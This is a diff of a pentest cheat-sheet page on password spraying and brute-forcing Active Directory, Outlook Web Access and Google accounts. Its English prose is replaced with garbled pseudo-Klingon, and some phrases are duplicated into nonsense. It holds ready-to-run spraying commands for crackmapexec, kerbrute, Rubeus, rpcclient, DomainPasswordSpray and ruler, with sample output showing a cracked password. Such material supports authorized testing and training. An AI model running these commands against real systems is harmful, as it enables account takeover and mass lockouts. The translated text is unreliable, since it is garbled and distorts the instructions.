@@ -26,14 +26,13 @@ Notice that you **could lockout some accounts if you try several wrong passwords
 ### Get password policy
 
 If you have some user credentials or a shell as a domain user you can **get the password policy with**:
-
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
 
 enum4linux -u 'username' -p 'password' -P <IP>
 
-rpcclient -U "" -N 10.10.10.10; 
+rpcclient -U "" -N 10.10.10.10;
 rpcclient $>querydominfo
 
 ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
@@ -43,57 +42,51 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-
 ### Exploitation from Linux (or all)
 
 * Using **crackmapexec:**
 
+### Klingon Translation:
+
+### Linux (yaj) (be'pu') vItlhutlh
+
+* **crackmapexec** vIlo'laHbe':
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-
-* Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
-
+* [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) **vIghro'** **kerbrute** **DIvI'** (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-
-* [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
-
+* [**ghItlh**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-
-* Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
-
+* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) lo'laHbe'chugh - vItlhutlh
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-
-* With the `scanner/smb/smb_login` module of **Metasploit**:
+* **Metasploit**-ghItlh scanner/smb/smb_login module vItlh:
 
 ![](<../../.gitbook/assets/image (132) (1).png>)
 
-* Using **rpcclient**:
-
+* **rpcclient**-Daq:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
-for u in $(cat users.txt); do 
-    rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
+for u in $(cat users.txt); do
+rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
+#### Windows-qaStaHvIS
 
-#### From Windows
-
-* With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
-
+* [Rubeus](https://github.com/Zer1t0/Rubeus) jImej vaj brute module:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -101,19 +94,14 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-
-* With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):
-
+* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (ghItlh users 'ej password policy 'ej tries according to it) users 'ej password policy 'ej tries according to it):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-
-* With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
-
+* [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) **ghItlhutlh**
 ```
 Invoke-SprayEmptyPassword
 ```
-
 ## Brute Force
 
 {% code overflow="wrap" %}
@@ -124,25 +112,23 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+**Outlook** vItlhutlh **password spraying** laH multiple tools.
 
-* With [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* with [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
-* With [Ruler](https://github.com/sensepost/ruler) (reliable!)
-* With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-* With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+* [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/) vItlhutlh
+* [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/) vItlhutlh
+* [Ruler](https://github.com/sensepost/ruler) (reliable!) vItlhutlh
+* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell) vItlhutlh
+* [MailSniper](https://github.com/dafthack/MailSniper) (Powershell) vItlhutlh
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
-
+vItlhutlh vItlhutlh, user list je password / password list vItlhutlh.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
-    [x] Failed: larsson:Summer2020
-    [x] Failed: cube0x0:Summer2020
-    [x] Failed: a.admin:Summer2020
-    [x] Failed: c.cube:Summer2020
-    [+] Success: s.svensson:Summer2020
+[x] Failed: larsson:Summer2020
+[x] Failed: cube0x0:Summer2020
+[x] Failed: a.admin:Summer2020
+[x] Failed: c.cube:Summer2020
+[+] Success: s.svensson:Summer2020
 ```
-
 ## Google
 
 * [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
